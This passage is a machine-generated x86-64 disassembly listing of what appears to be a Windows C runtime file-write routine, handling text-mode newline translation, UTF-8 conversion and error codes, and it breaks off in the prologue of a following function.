   1400072d1:	48 63 d9             	movslq %ecx,%rbx
   1400072d4:	89 6c 24 40          	mov    %ebp,0x40(%rsp)
   1400072d8:	45 85 c0             	test   %r8d,%r8d
   1400072db:	75 07                	jne    0x1400072e4
   1400072dd:	33 c0                	xor    %eax,%eax
   1400072df:	e9 e7 06 00 00       	jmp    0x1400079cb
   1400072e4:	48 85 d2             	test   %rdx,%rdx
   1400072e7:	75 2e                	jne    0x140007317
   1400072e9:	e8 d6 bd ff ff       	call   0x1400030c4
   1400072ee:	21 38                	and    %edi,(%rax)
   1400072f0:	e8 af bd ff ff       	call   0x1400030a4
   1400072f5:	48 21 7c 24 20       	and    %rdi,0x20(%rsp)
   1400072fa:	45 33 c9             	xor    %r9d,%r9d
   1400072fd:	45 33 c0             	xor    %r8d,%r8d
   140007300:	33 d2                	xor    %edx,%edx
   140007302:	33 c9                	xor    %ecx,%ecx
   140007304:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000730a:	e8 c5 bc ff ff       	call   0x140002fd4
   14000730f:	83 c8 ff             	or     $0xffffffff,%eax
   140007312:	e9 b4 06 00 00       	jmp    0x1400079cb
   140007317:	4c 8b fb             	mov    %rbx,%r15
   14000731a:	4c 8b f3             	mov    %rbx,%r14
   14000731d:	48 8d 05 5c f2 00 00 	lea    0xf25c(%rip),%rax        # 0x140016580
   140007324:	49 c1 fe 05          	sar    $0x5,%r14
   140007328:	41 83 e7 1f          	and    $0x1f,%r15d
   14000732c:	4a 8b 0c f0          	mov    (%rax,%r14,8),%rcx
   140007330:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140007335:	4d 6b ff 58          	imul   $0x58,%r15,%r15
   140007339:	41 8a 74 0f 38       	mov    0x38(%r15,%rcx,1),%sil
   14000733e:	40 02 f6             	add    %sil,%sil
   140007341:	40 d0 fe             	sar    $1,%sil
   140007344:	40 80 fe 02          	cmp    $0x2,%sil
   140007348:	74 06                	je     0x140007350
   14000734a:	40 80 fe 01          	cmp    $0x1,%sil
   14000734e:	75 09                	jne    0x140007359
   140007350:	41 8b c5             	mov    %r13d,%eax
   140007353:	f7 d0                	not    %eax
   140007355:	a8 01                	test   $0x1,%al
   140007357:	74 90                	je     0x1400072e9
   140007359:	41 f6 44 0f 08 20    	testb  $0x20,0x8(%r15,%rcx,1)
   14000735f:	74 0d                	je     0x14000736e
   140007361:	33 d2                	xor    %edx,%edx
   140007363:	8b cb                	mov    %ebx,%ecx
   140007365:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   140007369:	e8 5a fd ff ff       	call   0x1400070c8
   14000736e:	8b cb                	mov    %ebx,%ecx
   140007370:	e8 0b 08 00 00       	call   0x140007b80
   140007375:	85 c0                	test   %eax,%eax
   140007377:	0f 84 f1 02 00 00    	je     0x14000766e
   14000737d:	48 8d 05 fc f1 00 00 	lea    0xf1fc(%rip),%rax        # 0x140016580
   140007384:	4a 8b 04 f0          	mov    (%rax,%r14,8),%rax
   140007388:	41 f6 44 07 08 80    	testb  $0x80,0x8(%r15,%rax,1)
   14000738e:	0f 84 da 02 00 00    	je     0x14000766e
   140007394:	e8 77 c2 ff ff       	call   0x140003610
   140007399:	33 db                	xor    %ebx,%ebx
   14000739b:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400073a0:	48 8b 88 c0 00 00 00 	mov    0xc0(%rax),%rcx
   1400073a7:	48 8d 05 d2 f1 00 00 	lea    0xf1d2(%rip),%rax        # 0x140016580
   1400073ae:	39 59 14             	cmp    %ebx,0x14(%rcx)
   1400073b1:	4a 8b 0c f0          	mov    (%rax,%r14,8),%rcx
   1400073b5:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   1400073b9:	0f 94 c3             	sete   %bl
   1400073bc:	ff 15 f6 6c 00 00    	call   *0x6cf6(%rip)        # 0x14000e0b8
   1400073c2:	85 c0                	test   %eax,%eax
   1400073c4:	0f 84 a4 02 00 00    	je     0x14000766e
   1400073ca:	85 db                	test   %ebx,%ebx
   1400073cc:	74 09                	je     0x1400073d7
   1400073ce:	40 84 f6             	test   %sil,%sil
   1400073d1:	0f 84 97 02 00 00    	je     0x14000766e
   1400073d7:	ff 15 e3 6c 00 00    	call   *0x6ce3(%rip)        # 0x14000e0c0
   1400073dd:	21 7c 24 4c          	and    %edi,0x4c(%rsp)
   1400073e1:	49 8b dc             	mov    %r12,%rbx
   1400073e4:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400073e8:	45 85 ed             	test   %r13d,%r13d
   1400073eb:	0f 84 77 02 00 00    	je     0x140007668
   1400073f1:	44 8b 74 24 58       	mov    0x58(%rsp),%r14d
   1400073f6:	bd 0d 00 00 00       	mov    $0xd,%ebp
   1400073fb:	40 84 f6             	test   %sil,%sil
   1400073fe:	0f 85 83 01 00 00    	jne    0x140007587
   140007404:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   140007409:	8a 0b                	mov    (%rbx),%cl
   14000740b:	45 33 f6             	xor    %r14d,%r14d
   14000740e:	80 f9 0a             	cmp    $0xa,%cl
   140007411:	48 8d 2d 68 f1 00 00 	lea    0xf168(%rip),%rbp        # 0x140016580
   140007418:	48 8b 54 d5 00       	mov    0x0(%rbp,%rdx,8),%rdx
   14000741d:	41 0f 94 c6          	sete   %r14b
   140007421:	41 83 7c 17 50 00    	cmpl   $0x0,0x50(%r15,%rdx,1)
   140007427:	74 20                	je     0x140007449
   140007429:	41 8a 44 17 4c       	mov    0x4c(%r15,%rdx,1),%al
   14000742e:	88 4c 24 5d          	mov    %cl,0x5d(%rsp)
   140007432:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140007438:	88 44 24 5c          	mov    %al,0x5c(%rsp)
   14000743c:	41 83 64 17 50 00    	andl   $0x0,0x50(%r15,%rdx,1)
   140007442:	48 8d 54 24 5c       	lea    0x5c(%rsp),%rdx
   140007447:	eb 49                	jmp    0x140007492
   140007449:	0f be c9             	movsbl %cl,%ecx
   14000744c:	e8 43 0a 00 00       	call   0x140007e94
   140007451:	85 c0                	test   %eax,%eax
   140007453:	74 34                	je     0x140007489
   140007455:	49 8b c5             	mov    %r13,%rax
   140007458:	48 2b c3             	sub    %rbx,%rax
   14000745b:	49 03 c4             	add    %r12,%rax
   14000745e:	48 83 f8 01          	cmp    $0x1,%rax
   140007462:	0f 8e cf 01 00 00    	jle    0x140007637
   140007468:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   14000746d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140007473:	48 8b d3             	mov    %rbx,%rdx
   140007476:	e8 4d 24 00 00       	call   0x1400098c8
   14000747b:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000747e:	0f 84 76 01 00 00    	je     0x1400075fa
   140007484:	48 ff c3             	inc    %rbx
   140007487:	eb 1c                	jmp    0x1400074a5
   140007489:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000748f:	48 8b d3             	mov    %rbx,%rdx
   140007492:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   140007497:	e8 2c 24 00 00       	call   0x1400098c8
   14000749c:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000749f:	0f 84 55 01 00 00    	je     0x1400075fa
   1400074a5:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400074ab:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400074b1:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   1400074b5:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
   1400074ba:	4c 8d 44 24 44       	lea    0x44(%rsp),%r8
   1400074bf:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400074c5:	33 d2                	xor    %edx,%edx
   1400074c7:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   1400074ce:	00 
   1400074cf:	48 ff c3             	inc    %rbx
   1400074d2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400074d7:	ff 15 1b 6d 00 00    	call   *0x6d1b(%rip)        # 0x14000e1f8
   1400074dd:	8b e8                	mov    %eax,%ebp
   1400074df:	85 c0                	test   %eax,%eax
   1400074e1:	0f 84 13 01 00 00    	je     0x1400075fa
   1400074e7:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400074ec:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400074f2:	48 8d 0d 87 f0 00 00 	lea    0xf087(%rip),%rcx        # 0x140016580
   1400074f9:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   1400074fd:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140007502:	48 8d 54 24 5c       	lea    0x5c(%rsp),%rdx
   140007507:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   14000750b:	44 8b c5             	mov    %ebp,%r8d
   14000750e:	ff 15 94 6c 00 00    	call   *0x6c94(%rip)        # 0x14000e1a8
   140007514:	85 c0                	test   %eax,%eax
   140007516:	0f 84 42 01 00 00    	je     0x14000765e
   14000751c:	8b fb                	mov    %ebx,%edi
   14000751e:	41 2b fc             	sub    %r12d,%edi
   140007521:	03 7c 24 40          	add    0x40(%rsp),%edi
   140007525:	39 6c 24 4c          	cmp    %ebp,0x4c(%rsp)
   140007529:	0f 8c cb 00 00 00    	jl     0x1400075fa
   14000752f:	bd 0d 00 00 00       	mov    $0xd,%ebp
   140007534:	45 85 f6             	test   %r14d,%r14d
   140007537:	0f 84 af 00 00 00    	je     0x1400075ec
   14000753d:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140007542:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140007548:	40 88 6c 24 5c       	mov    %bpl,0x5c(%rsp)
   14000754d:	48 8d 0d 2c f0 00 00 	lea    0xf02c(%rip),%rcx        # 0x140016580
   140007554:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140007559:	44 8d 45 f4          	lea    -0xc(%rbp),%r8d
   14000755d:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   140007561:	48 8d 54 24 5c       	lea    0x5c(%rsp),%rdx
   140007566:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   14000756a:	ff 15 38 6c 00 00    	call   *0x6c38(%rip)        # 0x14000e1a8
   140007570:	85 c0                	test   %eax,%eax
   140007572:	0f 84 e6 00 00 00    	je     0x14000765e
   140007578:	83 7c 24 4c 01       	cmpl   $0x1,0x4c(%rsp)
   14000757d:	7c 7b                	jl     0x1400075fa
   14000757f:	ff 44 24 40          	incl   0x40(%rsp)
   140007583:	ff c7                	inc    %edi
   140007585:	eb 65                	jmp    0x1400075ec
   140007587:	40 80 fe 01          	cmp    $0x1,%sil
   14000758b:	74 06                	je     0x140007593
   14000758d:	40 80 fe 02          	cmp    $0x2,%sil
   140007591:	75 17                	jne    0x1400075aa
   140007593:	0f b7 03             	movzwl (%rbx),%eax
   140007596:	45 33 f6             	xor    %r14d,%r14d
   140007599:	66 83 f8 0a          	cmp    $0xa,%ax
   14000759d:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   1400075a2:	41 0f 94 c6          	sete   %r14b
   1400075a6:	48 83 c3 02          	add    $0x2,%rbx
   1400075aa:	40 80 fe 01          	cmp    $0x1,%sil
   1400075ae:	74 06                	je     0x1400075b6
   1400075b0:	40 80 fe 02          	cmp    $0x2,%sil
   1400075b4:	75 36                	jne    0x1400075ec
   1400075b6:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   1400075bb:	e8 80 20 00 00       	call   0x140009640
   1400075c0:	66 3b 44 24 44       	cmp    0x44(%rsp),%ax
   1400075c5:	0f 85 93 00 00 00    	jne    0x14000765e
   1400075cb:	83 c7 02             	add    $0x2,%edi
   1400075ce:	45 85 f6             	test   %r14d,%r14d
   1400075d1:	74 19                	je     0x1400075ec
   1400075d3:	8b cd                	mov    %ebp,%ecx
   1400075d5:	66 89 6c 24 44       	mov    %bp,0x44(%rsp)
   1400075da:	e8 61 20 00 00       	call   0x140009640
   1400075df:	66 3b 44 24 44       	cmp    0x44(%rsp),%ax
   1400075e4:	75 78                	jne    0x14000765e
   1400075e6:	ff c7                	inc    %edi
   1400075e8:	ff 44 24 40          	incl   0x40(%rsp)
   1400075ec:	8b c3                	mov    %ebx,%eax
   1400075ee:	41 2b c4             	sub    %r12d,%eax
   1400075f1:	41 3b c5             	cmp    %r13d,%eax
   1400075f4:	0f 82 01 fe ff ff    	jb     0x1400073fb
   1400075fa:	8b 5c 24 4c          	mov    0x4c(%rsp),%ebx
   1400075fe:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   140007603:	8b 6c 24 40          	mov    0x40(%rsp),%ebp
   140007607:	85 ff                	test   %edi,%edi
   140007609:	0f 85 b8 03 00 00    	jne    0x1400079c7
   14000760f:	85 db                	test   %ebx,%ebx
   140007611:	0f 84 7a 03 00 00    	je     0x140007991
   140007617:	83 fb 05             	cmp    $0x5,%ebx
   14000761a:	0f 85 65 03 00 00    	jne    0x140007985
   140007620:	e8 7f ba ff ff       	call   0x1400030a4
   140007625:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000762b:	e8 94 ba ff ff       	call   0x1400030c4
   140007630:	89 18                	mov    %ebx,(%rax)
   140007632:	e9 d8 fc ff ff       	jmp    0x14000730f
   140007637:	8a 03                	mov    (%rbx),%al
   140007639:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   14000763e:	ff c7                	inc    %edi
   140007640:	4a 8b 4c f5 00       	mov    0x0(%rbp,%r14,8),%rcx
   140007645:	41 88 44 0f 4c       	mov    %al,0x4c(%r15,%rcx,1)
   14000764a:	4a 8b 44 f5 00       	mov    0x0(%rbp,%r14,8),%rax
   14000764f:	41 c7 44 07 50 01 00 	movl   $0x1,0x50(%r15,%rax,1)
   140007656:	00 00 
   140007658:	8b 5c 24 4c          	mov    0x4c(%rsp),%ebx
   14000765c:	eb a5                	jmp    0x140007603
   14000765e:	ff 15 ec 69 00 00    	call   *0x69ec(%rip)        # 0x14000e050
   140007664:	8b d8                	mov    %eax,%ebx
   140007666:	eb 96                	jmp    0x1400075fe
   140007668:	8b 5c 24 4c          	mov    0x4c(%rsp),%ebx
   14000766c:	eb a1                	jmp    0x14000760f
   14000766e:	48 8d 05 0b ef 00 00 	lea    0xef0b(%rip),%rax        # 0x140016580
   140007675:	4a 8b 0c f0          	mov    (%rax,%r14,8),%rcx
   140007679:	41 f6 44 0f 08 80    	testb  $0x80,0x8(%r15,%rcx,1)
   14000767f:	0f 84 ca 02 00 00    	je     0x14000794f
   140007685:	33 db                	xor    %ebx,%ebx
   140007687:	49 8b ec             	mov    %r12,%rbp
   14000768a:	40 84 f6             	test   %sil,%sil
   14000768d:	0f 85 d0 00 00 00    	jne    0x140007763
   140007693:	45 85 ed             	test   %r13d,%r13d
   140007696:	0f 84 fc 02 00 00    	je     0x140007998
   14000769c:	8d 53 0d             	lea    0xd(%rbx),%edx
   14000769f:	44 8b 74 24 40       	mov    0x40(%rsp),%r14d
   1400076a4:	48 8d b4 24 20 07 00 	lea    0x720(%rsp),%rsi
   1400076ab:	00 
   1400076ac:	33 c9                	xor    %ecx,%ecx
   1400076ae:	8b c5                	mov    %ebp,%eax
   1400076b0:	41 2b c4             	sub    %r12d,%eax
   1400076b3:	41 3b c5             	cmp    %r13d,%eax
   1400076b6:	73 26                	jae    0x1400076de
   1400076b8:	8a 45 00             	mov    0x0(%rbp),%al
   1400076bb:	48 ff c5             	inc    %rbp
   1400076be:	3c 0a                	cmp    $0xa,%al
   1400076c0:	75 0b                	jne    0x1400076cd
   1400076c2:	88 16                	mov    %dl,(%rsi)
   1400076c4:	41 ff c6             	inc    %r14d
   1400076c7:	48 ff c6             	inc    %rsi
   1400076ca:	48 ff c1             	inc    %rcx
   1400076cd:	48 ff c1             	inc    %rcx
   1400076d0:	88 06                	mov    %al,(%rsi)
   1400076d2:	48 ff c6             	inc    %rsi
   1400076d5:	48 81 f9 ff 13 00 00 	cmp    $0x13ff,%rcx
   1400076dc:	72 d0                	jb     0x1400076ae
   1400076de:	48 21 5c 24 20       	and    %rbx,0x20(%rsp)
   1400076e3:	48 8d 84 24 20 07 00 	lea    0x720(%rsp),%rax
   1400076ea:	00 
   1400076eb:	44 8b c6             	mov    %esi,%r8d
   1400076ee:	44 2b c0             	sub    %eax,%r8d
   1400076f1:	48 8d 05 88 ee 00 00 	lea    0xee88(%rip),%rax        # 0x140016580
   1400076f8:	44 89 74 24 40       	mov    %r14d,0x40(%rsp)
   1400076fd:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   140007702:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140007707:	48 8d 94 24 20 07 00 	lea    0x720(%rsp),%rdx
   14000770e:	00 
   14000770f:	4a 8b 0c f0          	mov    (%rax,%r14,8),%rcx
   140007713:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   140007717:	ff 15 8b 6a 00 00    	call   *0x6a8b(%rip)        # 0x14000e1a8
   14000771d:	85 c0                	test   %eax,%eax
   14000771f:	74 35                	je     0x140007756
   140007721:	03 7c 24 48          	add    0x48(%rsp),%edi
   140007725:	48 8d 84 24 20 07 00 	lea    0x720(%rsp),%rax
   14000772c:	00 
   14000772d:	48 2b f0             	sub    %rax,%rsi
   140007730:	48 63 44 24 48       	movslq 0x48(%rsp),%rax
   140007735:	48 3b c6             	cmp    %rsi,%rax
   140007738:	0f 8c c5 fe ff ff    	jl     0x140007603
   14000773e:	8b c5                	mov    %ebp,%eax
   140007740:	ba 0d 00 00 00       	mov    $0xd,%edx
   140007745:	41 2b c4             	sub    %r12d,%eax
   140007748:	41 3b c5             	cmp    %r13d,%eax
   14000774b:	0f 82 4e ff ff ff    	jb     0x14000769f
   140007751:	e9 ad fe ff ff       	jmp    0x140007603
   140007756:	ff 15 f4 68 00 00    	call   *0x68f4(%rip)        # 0x14000e050
   14000775c:	8b d8                	mov    %eax,%ebx
   14000775e:	e9 a0 fe ff ff       	jmp    0x140007603
   140007763:	40 80 fe 02          	cmp    $0x2,%sil
   140007767:	0f 85 d4 00 00 00    	jne    0x140007841
   14000776d:	45 85 ed             	test   %r13d,%r13d
   140007770:	0f 84 22 02 00 00    	je     0x140007998
   140007776:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000777b:	44 8b 74 24 40       	mov    0x40(%rsp),%r14d
   140007780:	48 8d b4 24 20 07 00 	lea    0x720(%rsp),%rsi
   140007787:	00 
   140007788:	33 c9                	xor    %ecx,%ecx
   14000778a:	8b c5                	mov    %ebp,%eax
   14000778c:	41 2b c4             	sub    %r12d,%eax
   14000778f:	41 3b c5             	cmp    %r13d,%eax
   140007792:	73 31                	jae    0x1400077c5
   140007794:	0f b7 45 00          	movzwl 0x0(%rbp),%eax
   140007798:	48 83 c5 02          	add    $0x2,%rbp
   14000779c:	66 83 f8 0a          	cmp    $0xa,%ax
   1400077a0:	75 0f                	jne    0x1400077b1
   1400077a2:	66 89 16             	mov    %dx,(%rsi)
   1400077a5:	41 83 c6 02          	add    $0x2,%r14d
   1400077a9:	48 83 c6 02          	add    $0x2,%rsi
   1400077ad:	48 83 c1 02          	add    $0x2,%rcx
   1400077b1:	48 83 c1 02          	add    $0x2,%rcx
   1400077b5:	66 89 06             	mov    %ax,(%rsi)
   1400077b8:	48 83 c6 02          	add    $0x2,%rsi
   1400077bc:	48 81 f9 fe 13 00 00 	cmp    $0x13fe,%rcx
   1400077c3:	72 c5                	jb     0x14000778a
   1400077c5:	48 21 5c 24 20       	and    %rbx,0x20(%rsp)
   1400077ca:	48 8d 84 24 20 07 00 	lea    0x720(%rsp),%rax
   1400077d1:	00 
   1400077d2:	44 8b c6             	mov    %esi,%r8d
   1400077d5:	44 2b c0             	sub    %eax,%r8d
   1400077d8:	48 8d 05 a1 ed 00 00 	lea    0xeda1(%rip),%rax        # 0x140016580
   1400077df:	44 89 74 24 40       	mov    %r14d,0x40(%rsp)
   1400077e4:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   1400077e9:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1400077ee:	48 8d 94 24 20 07 00 	lea    0x720(%rsp),%rdx
   1400077f5:	00 
   1400077f6:	4a 8b 0c f0          	mov    (%rax,%r14,8),%rcx
   1400077fa:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   1400077fe:	ff 15 a4 69 00 00    	call   *0x69a4(%rip)        # 0x14000e1a8
   140007804:	85 c0                	test   %eax,%eax
   140007806:	0f 84 4a ff ff ff    	je     0x140007756
   14000780c:	03 7c 24 48          	add    0x48(%rsp),%edi
   140007810:	48 8d 84 24 20 07 00 	lea    0x720(%rsp),%rax
   140007817:	00 
   140007818:	48 2b f0             	sub    %rax,%rsi
   14000781b:	48 63 44 24 48       	movslq 0x48(%rsp),%rax
   140007820:	48 3b c6             	cmp    %rsi,%rax
   140007823:	0f 8c da fd ff ff    	jl     0x140007603
   140007829:	8b c5                	mov    %ebp,%eax
   14000782b:	ba 0d 00 00 00       	mov    $0xd,%edx
   140007830:	41 2b c4             	sub    %r12d,%eax
   140007833:	41 3b c5             	cmp    %r13d,%eax
   140007836:	0f 82 3f ff ff ff    	jb     0x14000777b
   14000783c:	e9 c2 fd ff ff       	jmp    0x140007603
   140007841:	45 85 ed             	test   %r13d,%r13d
   140007844:	0f 84 4e 01 00 00    	je     0x140007998
   14000784a:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   140007850:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140007855:	33 d2                	xor    %edx,%edx
   140007857:	8b c5                	mov    %ebp,%eax
   140007859:	41 2b c4             	sub    %r12d,%eax
   14000785c:	41 3b c5             	cmp    %r13d,%eax
   14000785f:	73 2e                	jae    0x14000788f
   140007861:	0f b7 45 00          	movzwl 0x0(%rbp),%eax
   140007865:	48 83 c5 02          	add    $0x2,%rbp
   140007869:	66 83 f8 0a          	cmp    $0xa,%ax
   14000786d:	75 0c                	jne    0x14000787b
   14000786f:	66 44 89 01          	mov    %r8w,(%rcx)
   140007873:	48 83 c1 02          	add    $0x2,%rcx
   140007877:	48 83 c2 02          	add    $0x2,%rdx
   14000787b:	48 83 c2 02          	add    $0x2,%rdx
   14000787f:	66 89 01             	mov    %ax,(%rcx)
   140007882:	48 83 c1 02          	add    $0x2,%rcx
   140007886:	48 81 fa a8 06 00 00 	cmp    $0x6a8,%rdx
   14000788d:	72 c8                	jb     0x140007857
   14000788f:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140007895:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000789b:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400078a0:	2b c8                	sub    %eax,%ecx
   1400078a2:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400078a7:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   1400078ae:	00 
   1400078af:	8b c1                	mov    %ecx,%eax
   1400078b1:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   1400078b6:	99                   	cltd
   1400078b7:	2b c2                	sub    %edx,%eax
   1400078b9:	33 d2                	xor    %edx,%edx
   1400078bb:	d1 f8                	sar    $1,%eax
   1400078bd:	44 8b c8             	mov    %eax,%r9d
   1400078c0:	48 8d 84 24 20 07 00 	lea    0x720(%rsp),%rax
   1400078c7:	00 
   1400078c8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400078cd:	ff 15 25 69 00 00    	call   *0x6925(%rip)        # 0x14000e1f8
   1400078d3:	44 8b f0             	mov    %eax,%r14d
   1400078d6:	85 c0                	test   %eax,%eax
   1400078d8:	0f 84 80 fd ff ff    	je     0x14000765e
   1400078de:	33 f6                	xor    %esi,%esi
   1400078e0:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400078e5:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400078eb:	48 63 ce             	movslq %esi,%rcx
   1400078ee:	48 8d 94 0c 20 07 00 	lea    0x720(%rsp,%rcx,1),%rdx
   1400078f5:	00 
   1400078f6:	45 8b c6             	mov    %r14d,%r8d
   1400078f9:	48 8d 0d 80 ec 00 00 	lea    0xec80(%rip),%rcx        # 0x140016580
   140007900:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   140007904:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140007909:	44 2b c6             	sub    %esi,%r8d
   14000790c:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   140007910:	ff 15 92 68 00 00    	call   *0x6892(%rip)        # 0x14000e1a8
   140007916:	85 c0                	test   %eax,%eax
   140007918:	74 0b                	je     0x140007925
   14000791a:	03 74 24 48          	add    0x48(%rsp),%esi
   14000791e:	44 3b f6             	cmp    %esi,%r14d
   140007921:	7f bd                	jg     0x1400078e0
   140007923:	eb 08                	jmp    0x14000792d
   140007925:	ff 15 25 67 00 00    	call   *0x6725(%rip)        # 0x14000e050
   14000792b:	8b d8                	mov    %eax,%ebx
   14000792d:	44 3b f6             	cmp    %esi,%r14d
   140007930:	0f 8f c8 fc ff ff    	jg     0x1400075fe
   140007936:	8b fd                	mov    %ebp,%edi
   140007938:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   14000793e:	41 2b fc             	sub    %r12d,%edi
   140007941:	41 3b fd             	cmp    %r13d,%edi
   140007944:	0f 82 06 ff ff ff    	jb     0x140007850
   14000794a:	e9 af fc ff ff       	jmp    0x1400075fe
   14000794f:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   140007953:	48 21 7c 24 20       	and    %rdi,0x20(%rsp)
   140007958:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   14000795d:	45 8b c5             	mov    %r13d,%r8d
   140007960:	49 8b d4             	mov    %r12,%rdx
   140007963:	ff 15 3f 68 00 00    	call   *0x683f(%rip)        # 0x14000e1a8
   140007969:	85 c0                	test   %eax,%eax
   14000796b:	74 0b                	je     0x140007978
   14000796d:	8b 7c 24 48          	mov    0x48(%rsp),%edi
   140007971:	33 db                	xor    %ebx,%ebx
   140007973:	e9 8f fc ff ff       	jmp    0x140007607
   140007978:	ff 15 d2 66 00 00    	call   *0x66d2(%rip)        # 0x14000e050
   14000797e:	8b d8                	mov    %eax,%ebx
   140007980:	e9 82 fc ff ff       	jmp    0x140007607
   140007985:	8b cb                	mov    %ebx,%ecx
   140007987:	e8 58 b7 ff ff       	call   0x1400030e4
   14000798c:	e9 7e f9 ff ff       	jmp    0x14000730f
   140007991:	48 8d 05 e8 eb 00 00 	lea    0xebe8(%rip),%rax        # 0x140016580
   140007998:	4a 8b 04 f0          	mov    (%rax,%r14,8),%rax
   14000799c:	41 f6 44 07 08 40    	testb  $0x40,0x8(%r15,%rax,1)
   1400079a2:	74 0b                	je     0x1400079af
   1400079a4:	41 80 3c 24 1a       	cmpb   $0x1a,(%r12)
   1400079a9:	0f 84 2e f9 ff ff    	je     0x1400072dd
   1400079af:	e8 f0 b6 ff ff       	call   0x1400030a4
   1400079b4:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   1400079ba:	e8 05 b7 ff ff       	call   0x1400030c4
   1400079bf:	83 20 00             	andl   $0x0,(%rax)
   1400079c2:	e9 48 f9 ff ff       	jmp    0x14000730f
   1400079c7:	2b fd                	sub    %ebp,%edi
   1400079c9:	8b c7                	mov    %edi,%eax
   1400079cb:	48 8b 8c 24 20 1b 00 	mov    0x1b20(%rsp),%rcx
   1400079d2:	00 
   1400079d3:	48 33 cc             	xor    %rsp,%rcx
   1400079d6:	e8 65 a0 ff ff       	call   0x140001a40
   1400079db:	48 8b 9c 24 88 1b 00 	mov    0x1b88(%rsp),%rbx
   1400079e2:	00 
   1400079e3:	48 81 c4 30 1b 00 00 	add    $0x1b30,%rsp
   1400079ea:	41 5f                	pop    %r15
   1400079ec:	41 5e                	pop    %r14
   1400079ee:	41 5d                	pop    %r13
   1400079f0:	41 5c                	pop    %r12
   1400079f2:	5f                   	pop    %rdi
   1400079f3:	5e                   	pop    %rsi
   1400079f4:	5d                   	pop    %rbp
   1400079f5:	c3                   	ret
   1400079f6:	cc                   	int3
   1400079f7:	cc                   	int3
   1400079f8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400079fd:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007a02:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140007a06:	57                   	push   %rdi
   140007a07:	41 54                	push   %r12
   140007a09:	41 55                	push   %r13
   140007a0b:	41 56                	push   %r14
   140007a0d:	41 57                	push   %r15
   140007a0f:	48 83 ec 30          	sub    $0x30,%rsp
   140007a13:	45 8b e0             	mov    %r8d,%r12d
   140007a16:	4c 8b ea             	mov    %rdx,%r13
   140007a19:	48 63 d9             	movslq %ecx,%rbx
   140007a1c:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140007a1f:	75 1c                	jne    0x140007a3d
   140007a21:	e8 9e b6 ff ff       	call   0x1400030c4
   140007a26:	33 ff                	xor    %edi,%edi
   140007a28:	89 38                	mov    %edi,(%rax)
   140007a2a:	e8 75 b6 ff ff       	call   0x1400030a4
   140007a2f:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007a35:	83 c8 ff             	or     $0xffffffff,%eax
   140007a38:	e9 d4 00 00 00       	jmp    0x140007b11
   140007a3d:	33 ff                	xor    %edi,%edi
   140007a3f:	3b df                	cmp    %edi,%ebx
   140007a41:	0f 8c a1 00 00 00    	jl     0x140007ae8
   140007a47:	3b 1d 1b eb 00 00    	cmp    0xeb1b(%rip),%ebx        # 0x140016568
   140007a4d:	0f 83 95 00 00 00    	jae    0x140007ae8
